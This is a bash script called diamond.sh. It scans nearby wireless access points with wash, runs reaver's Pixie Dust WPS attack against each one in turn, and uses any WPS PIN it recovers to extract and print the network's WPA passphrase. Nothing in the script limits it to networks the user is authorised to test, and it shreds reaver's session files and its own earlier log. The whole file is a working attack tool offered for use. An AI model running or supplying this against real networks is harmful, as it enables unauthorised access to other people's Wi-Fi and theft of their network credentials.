#!/bin/bash
##
### diamond.sh - look for APs with pixie vulnerability 
##
#
timeout=$2
red="\e[0;91m"
green="\e[0;92m"
blue="\e[0;94m"
esc="\e[0m"
uline="\e[4m"

if [ ! $1 ] || [ ! $2 ]; then
	echo " Usage: $0 <interface> <timeout> -r(exclusively ralink chipsets)"
	exit
fi

if [ $(whoami) != "root" ]; then
	echo "[!] Login as root and try again.."
	exit
fi

if [ ! "$(which wash)" ] || [ ! "$(which reaver)" ]; then
	echo "[!] 'reaver' is not installed. Exiting.."
	exit
fi

if [ "$3" == "-r" ]; then
	ra="true"
elif [ "$3" != "-r" ]; then
	ra="false"
fi

cleanup() {
	pkill reaver	
	pkill wash
	pkill tail
	rm -f wash.tmp wash.txt
	exit
}

trap cleanup SIGINT
echo -e "[-] Gathering AP data for ${blue}$timeout${esc} seconds.."
wash -i $1 >> wash.tmp &

if [ "$ra" == "true" ]; then
	echo -e "[!] Scanning for ${green}Ralink${esc} chipsets only.."
	tail -f wash.tmp | grep 'Ralink' &
elif [ "$ra" == "false" ]; then
	tail -f wash.tmp | grep -E '[0-9A-F]{2}\:[0-9A-F]{2}\:[0-9A-F]{2}\:[0-9A-F]{2}\:[0-9A-F]{2}\:[0-9A-F]{2}' &
fi

sleep $timeout
pkill tail
pkill wash

if [ "$ra" == "true" ]; then
	cat wash.tmp | grep -E 'Ralink' >> wash.txt
elif [ "$ra" == "false" ]; then
	cat wash.tmp | grep -E '[0-9A-F]{2}\:[0-9A-F]{2}\:[0-9A-F]{2}\:[0-9A-F]{2}\:[0-9A-F]{2}\:[0-9A-F]{2}' >> wash.txt
fi

rm -f wash.tmp

bssid=($(cat wash.txt | tr -s ' ' | cut -d ' ' -f 1))
channel=($(cat wash.txt | tr -s ' ' | cut -d ' ' -f 2))
signal=($(cat wash.txt | tr -s ' ' | cut -d ' ' -f 3))
wpsver=($(cat wash.txt | tr -s ' ' | cut -d ' ' -f 4))
wpslock=($(cat wash.txt | tr -s ' ' | cut -d ' ' -f 5))
vendor=($(cat wash.txt | tr -s ' ' | cut -d ' ' -f 6))
essid=($(cat wash.txt | tr -s ' ' | cut -d ' ' -f 7))

rm -f wash.txt

if [ "$(ls /var/lib/reaver)" ]; then
	shred -u /var/lib/reaver/*.wpc
fi

if [ -f "diamond.log" ]; then
	shred -u diamond.log
fi

echo -e "\n[-] ${red}Checking ${#bssid[*]} AP(s) for Pixie WPS Vulnerability..${esc}\n"

for ((x = 0; x < ${#bssid[*]}; x++)); do

	if [ ! "${vendor[x]}" ]; then
		${vendor[x]}="Unknown"
	fi

	echo -e "[-] ${blue}ESSID:${esc} ${essid[x]} ${blue}BSSID:${esc} ${bssid[x]} ${blue}Signal:${esc} ${signal[x]}" 
	echo -e "[-] ${blue}Vendor:${esc} ${vendor[x]} ${blue}Channel:${esc} ${channel[x]} ${blue}WPS Version:${esc} ${wpsver[x]} ${blue}WPS Lock:${esc} ${wpslock[x]}"
	echo "ESSID: ${essid[x]} BSSID: ${bssid[x]} Channel: ${channel[x]} Vendor: ${vendor[x]}" >> diamond.log 
	reaver -i $1 -b ${bssid[x]} -K -q 2>/dev/null >> diamond.log &
	echo -e "[-] Trying for ${red}$timeout${esc} seconds.."
	sleep $timeout
	pkill reaver

	if [ ! "$(cat diamond.log | grep ${bssid[x]} -A 12 | grep 'WPS pin:' | grep -E '[0-9]{8}')" ]; then
		echo -e "[!] ${red}Access point not vulnerable.${esc}\n"
	elif [ "$(cat diamond.log | grep ${bssid[x]} -A 12 | grep 'WPS pin:' | grep -E '[0-9]{8}')" ]; then
		pin=$(cat diamond.log | grep ${bssid[x]} -A 12 | grep 'WPS pin:' | grep -Eo '[0-9]{8}')
		echo -e "[!] ${green}Access point vulnerable.${esc}"
		echo -e "[-] Registering ${red}WPS PIN:${esc} ${uline}$pin${esc} with AP.."
		psk=$(reaver -i $1 -b ${bssid[x]} -c ${channel[x]} -p $pin 2>/dev/null | grep 'PSK')
		echo -e "${uline}$psk${esc}\n"
	fi
done

echo -e "[-] ${blue}${uline}$0${esc} has finished. Check '${green}${uline}diamond.log${esc}' for details."
echo -e "[+] ${green}${uline}diamond.log:${esc}"
cat diamond.log | grep 'WPS PIN' -A 2
cat diamond.log | grep 'WPS pin:' -B 12 | grep -E 'ESSID|WPS pin:'
exit
